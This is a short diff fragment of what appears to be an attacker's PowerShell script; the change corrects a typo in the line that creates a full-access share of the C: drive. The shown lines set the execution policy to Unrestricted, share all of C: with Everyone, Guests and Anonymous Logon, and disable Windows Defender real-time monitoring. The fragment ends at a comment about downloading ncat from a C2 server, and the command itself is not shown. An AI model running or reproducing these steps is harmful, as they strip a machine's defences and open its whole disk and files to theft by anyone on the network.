@@ -1,7 +1,7 @@
 #Fix stupid Powershell execution policy
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
 #Create unrestricted samba share on C:
-New-SmbShare -Name "CShare" -Path "C:\" -FullAccess "Everyone","Guests","Anonmyous Logon"
+New-SmbShare -Name "CShare" -Path "C:\" -FullAccess "Everyone","Guests","Anonymous Logon"
 #Kill Windows Defender
 Set-MpPreference -DisableRealtimeMonitoring $true
 #Download ncat binary from C2
